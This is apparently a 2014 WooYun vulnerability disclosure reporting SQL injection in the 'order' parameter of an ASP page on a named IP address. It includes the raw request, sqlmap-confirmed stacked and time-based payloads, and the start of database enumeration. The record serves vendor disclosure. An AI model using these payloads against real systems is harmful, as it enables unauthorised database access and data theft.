wybug_detail:
漏洞详情 披露状态：   									2014-06-05：	细节已通知厂商并且等待厂商处理中									2014-06-05：	厂商已经确认，细节仅向厂商公开									2014-06-15：	细节向核心白帽子及相关领域专家公开									2014-06-25：	细节向普通白帽子公开									2014-07-05：	细节向实习白帽子公开									2014-07-23：	细节向公众公开  简要描述： 不多说 详细说明：  GET /textlink.asp?catid=16&order=1'%22 HTTP/1.1Referer: http://218.106.133.143:80/ITindex.aspCookie: ASPSESSIONIDSCBABSAD=DOIDGICAICPKKCNCAEEAPMPDHost: 218.106.133.143Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*GET注入   漏洞证明：  

GET parameter 'order' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 303 HTTP(s) requests:---Place: GETParameter: order    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: catid=16&order=1; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: catid=16&order=1 WAITFOR DELAY '0:0:5'-----[17:01:52] [INFO] testing Microsoft SQL Server[17:01:52] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors [17:01:58] [INFO] confirming Microsoft SQL Server[17:02:06] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2000web application technology: ASP.NET, ASP, Microsoft IIS 5.0back-end DBMS: Microsoft SQL Server 2000[17:02:06] [INFO] fetching database names[17:02:06] [INFO] fetching number of databases[17:02:06] [INFO] retrieved: 25[17:02:35] [INFO] retrieved: CDMES[17:04:17] [INFO] retrieved: Co   修复方案：  自己修复吧   版权声明：转载请注明来源 Melody@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-06-05 17:23 厂商回复： 谢谢您的提交 最新状态： 暂无
